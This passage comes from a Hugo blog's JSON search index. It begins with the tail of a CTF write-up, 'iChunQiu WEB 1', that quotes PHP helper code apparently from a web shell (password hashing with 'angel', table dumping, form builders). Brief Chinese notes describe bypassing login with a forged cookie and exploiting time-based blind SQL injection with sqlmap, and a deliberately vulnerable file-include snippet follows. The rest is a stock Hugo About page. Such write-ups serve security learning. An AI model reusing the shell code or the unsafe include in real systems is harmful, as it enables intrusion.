mysql_fetch_assoc($rows)) { foreach ($row as $k =\u0026gt; $v) { $row[$k] = \u0026#34;\u0026#39;\u0026#34; . @mysql_real_escape_string($v) . \u0026#34;\u0026#39;\u0026#34;; } $tabledump = \u0026#39;INSERT INTO `\u0026#39; . $table . \u0026#39;` VALUES (\u0026#39; . implode(\u0026#34;, \u0026#34;, $row) . \u0026#39;);\u0026#39; . \u0026#34;\\n\u0026#34;; if ($fp) { fwrite($fp, $tabledump); } else { echo $tabledump; } } fwrite($fp, \u0026#34;\\n\\n\u0026#34;); fr($rows); } function p($str) { echo $str . \u0026#34;\\n\u0026#34;; } function tbhead() { p(\u0026#39;\u0026lt;table width=\u0026#34;100%\u0026#34; border=\u0026#34;0\u0026#34; cellpadding=\u0026#34;4\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026#39;); } function tbfoot() { p(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;); } function makehide($name, $value = \u0026#39;\u0026#39;) { p(\u0026#34;\u0026lt;input id=\\\u0026#34;$name\\\u0026#34; type=\\\u0026#34;hidden\\\u0026#34; name=\\\u0026#34;$name\\\u0026#34; value=\\\u0026#34;$value\\\u0026#34; /\u0026gt;\u0026#34;); } function makeinput($arg = array()) { $arg[\u0026#39;size\u0026#39;] = $arg[\u0026#39;size\u0026#39;] \u0026gt; 0 ? \u0026#34;size=\\\u0026#34;$arg[size]\\\u0026#34;\u0026#34; : \u0026#34;size=\\\u0026#34;100\\\u0026#34;\u0026#34;; $arg[\u0026#39;extra\u0026#39;] = $arg[\u0026#39;extra\u0026#39;] ? $arg[\u0026#39;extra\u0026#39;] : \u0026#39;\u0026#39;; !$arg[\u0026#39;type\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;type\u0026#39;] = \u0026#39;text\u0026#39;; $arg[\u0026#39;title\u0026#39;] = $arg[\u0026#39;title\u0026#39;] ? $arg[\u0026#39;title\u0026#39;] . \u0026#39;\u0026lt;br /\u0026gt;\u0026#39; : \u0026#39;\u0026#39;; $arg[\u0026#39;class\u0026#39;] = $arg[\u0026#39;class\u0026#39;] ? $arg[\u0026#39;class\u0026#39;] : \u0026#39;input\u0026#39;; if ($arg[\u0026#39;newline\u0026#39;]) { p(\u0026#34;\u0026lt;p\u0026gt;$arg[title]\u0026lt;input class=\\\u0026#34;$arg[class]\\\u0026#34; name=\\\u0026#34;$arg[name]\\\u0026#34; id=\\\u0026#34;$arg[name]\\\u0026#34; value=\\\u0026#34;$arg[value]\\\u0026#34; type=\\\u0026#34;$arg[type]\\\u0026#34; $arg[size] $arg[extra] /\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;); } else { p(\u0026#34;$arg[title]\u0026lt;input class=\\\u0026#34;$arg[class]\\\u0026#34; name=\\\u0026#34;$arg[name]\\\u0026#34; id=\\\u0026#34;$arg[name]\\\u0026#34; value=\\\u0026#34;$arg[value]\\\u0026#34; type=\\\u0026#34;$arg[type]\\\u0026#34; $arg[size] $arg[extra] /\u0026gt;\u0026#34;); } } function makeselect($arg = array()) { if ($arg[\u0026#39;onchange\u0026#39;]) { $onchange = \u0026#39;onchange=\u0026#34;\u0026#39; . $arg[\u0026#39;onchange\u0026#39;] . \u0026#39;\u0026#34;\u0026#39;; } $arg[\u0026#39;title\u0026#39;] = $arg[\u0026#39;title\u0026#39;] ? $arg[\u0026#39;title\u0026#39;] : \u0026#39;\u0026#39;; if ($arg[\u0026#39;newline\u0026#39;]) p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#34;$arg[title] \u0026lt;select class=\\\u0026#34;input\\\u0026#34; id=\\\u0026#34;$arg[name]\\\u0026#34; name=\\\u0026#34;$arg[name]\\\u0026#34; $onchange\u0026gt;\u0026#34;); if (is_array($arg[\u0026#39;option\u0026#39;])) { if ($arg[\u0026#39;nokey\u0026#39;]) { foreach ($arg[\u0026#39;option\u0026#39;] as $value) { if ($arg[\u0026#39;selected\u0026#39;] == $value) { p(\u0026#34;\u0026lt;option value=\\\u0026#34;$value\\\u0026#34; selected\u0026gt;$value\u0026lt;/option\u0026gt;\u0026#34;); } else { p(\u0026#34;\u0026lt;option value=\\\u0026#34;$value\\\u0026#34;\u0026gt;$value\u0026lt;/option\u0026gt;\u0026#34;); } } } else { foreach ($arg[\u0026#39;option\u0026#39;] as $key =\u0026gt; $value) { if ($arg[\u0026#39;selected\u0026#39;] == $key) { p(\u0026#34;\u0026lt;option value=\\\u0026#34;$key\\\u0026#34; selected\u0026gt;$value\u0026lt;/option\u0026gt;\u0026#34;); } else { p(\u0026#34;\u0026lt;option value=\\\u0026#34;$key\\\u0026#34;\u0026gt;$value\u0026lt;/option\u0026gt;\u0026#34;); } } } } p(\u0026#34;\u0026lt;/select\u0026gt;\u0026#34;); if ($arg[\u0026#39;newline\u0026#39;]) p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); } function formhead($arg = array()) { global $self; !$arg[\u0026#39;method\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;method\u0026#39;] = \u0026#39;post\u0026#39;; !$arg[\u0026#39;action\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;action\u0026#39;] = $self; $arg[\u0026#39;target\u0026#39;] = $arg[\u0026#39;target\u0026#39;] ? \u0026#34;target=\\\u0026#34;$arg[target]\\\u0026#34;\u0026#34; : \u0026#39;\u0026#39;; !$arg[\u0026#39;name\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;name\u0026#39;] = \u0026#39;form1\u0026#39;; p(\u0026#34;\u0026lt;form name=\\\u0026#34;$arg[name]\\\u0026#34; id=\\\u0026#34;$arg[name]\\\u0026#34; action=\\\u0026#34;$arg[action]\\\u0026#34; method=\\\u0026#34;$arg[method]\\\u0026#34; $arg[target]\u0026gt;\u0026#34;); if ($arg[\u0026#39;title\u0026#39;]) { p(\u0026#39;\u0026lt;h2\u0026gt;\u0026#39; . $arg[\u0026#39;title\u0026#39;] . \u0026#39; »\u0026lt;/h2\u0026gt;\u0026#39;); } } function maketext($arg = array()) { !$arg[\u0026#39;cols\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;cols\u0026#39;] = 100; !$arg[\u0026#39;rows\u0026#39;] \u0026amp;\u0026amp; $arg[\u0026#39;rows\u0026#39;] = 25; $arg[\u0026#39;title\u0026#39;] = $arg[\u0026#39;title\u0026#39;] ? $arg[\u0026#39;title\u0026#39;] . \u0026#39;\u0026lt;br /\u0026gt;\u0026#39; : \u0026#39;\u0026#39;; p(\u0026#34;\u0026lt;p\u0026gt;$arg[title]\u0026lt;textarea class=\\\u0026#34;area\\\u0026#34; id=\\\u0026#34;$arg[name]\\\u0026#34; name=\\\u0026#34;$arg[name]\\\u0026#34; cols=\\\u0026#34;$arg[cols]\\\u0026#34; rows=\\\u0026#34;$arg[rows]\\\u0026#34; $arg[extra]\u0026gt;$arg[value]\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\u0026#34;); } function formfooter($name = \u0026#39;\u0026#39;) { !$name \u0026amp;\u0026amp; $name = \u0026#39;submit\u0026#39;; p(\u0026#39;\u0026lt;p\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; name=\u0026#34;\u0026#39; . $name . \u0026#39;\u0026#34; id=\u0026#34;\u0026#39; . $name . \u0026#39;\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/form\u0026gt;\u0026#39;); } function goback() { global $self, $nowpath; p(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;dir\u0026#34; value=\u0026#34;\u0026#39; . $nowpath . \u0026#39;\u0026#34; /\u0026gt;\u0026lt;p\u0026gt;\u0026lt;input class=\u0026#34;bt\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Go back...\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;/form\u0026gt;\u0026#39;); } function formfoot() { p(\u0026#39;\u0026lt;/form\u0026gt;\u0026#39;); } // 728193099115dcaa67805a0776785b3a function encode_pass($pass) { $pass = md5(\u0026#39;angel\u0026#39; . $pass); $pass = md5($pass . \u0026#39;angel\u0026#39;); $pass = md5(\u0026#39;angel\u0026#39; . $pass . \u0026#39;angel\u0026#39;); return $pass; } function pr($s) { echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . print_r($s) . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } ?\u0026gt; 只需要构造应该cookie就能绕过登录，直接拿到写好的shell读flag\nWeb 10 ez xss\nWeb 09 ez include\nWeb 08 sql注入，时间盲注，sqlmap能出来\n文件包含绕过 \u0026lt;?php highlight_file(__FILE__); include(\u0026#34;./check.php\u0026#34;); if(isset($_GET[\u0026#39;filename\u0026#39;])){ $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); } ?\u0026gt; ","permalink":"//localhost:1313/posts/ichunqiu-web-1/","tags":["WEB"],"title":"iChunQiu WEB 1"},{"categories":null,"content":"Written in Go, Hugo is an open source static site generator available under the Apache Licence 2.0. Hugo supports TOML, YAML and JSON data file types, Markdown and HTML content files and uses shortcodes to add rich content. Other notable features are taxonomies, multilingual mode, image processing, custom output formats, HTML/CSS/JS minification and support for Sass SCSS workflows.\nHugo makes use of a variety of open source projects including:\nhttps://github.com/yuin/goldmark https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper Hugo is ideal for blogs, corporate websites, creative portfolios, online magazines, single page applications or even a website with thousands of pages.\nHugo is for people who want to hand code their own website without worrying about setting up complicated runtimes, dependencies and databases.\nWebsites built with Hugo are extremely fast, secure and can be deployed anywhere including, AWS, GitHub Pages, Heroku, Netlify and any other hosting provider.\nLearn more and contribute on GitHub .\n","permalink":"//localhost:1313/about/","tags":null,"title":"About"},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.es/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.fr/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.hi/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.jp/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.pl/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.ru/","tags":null,"title":""},{"categories":null,"content":"","permalink":"//localhost:1313/search/_index.zh-cn/","tags":null,"title":""}]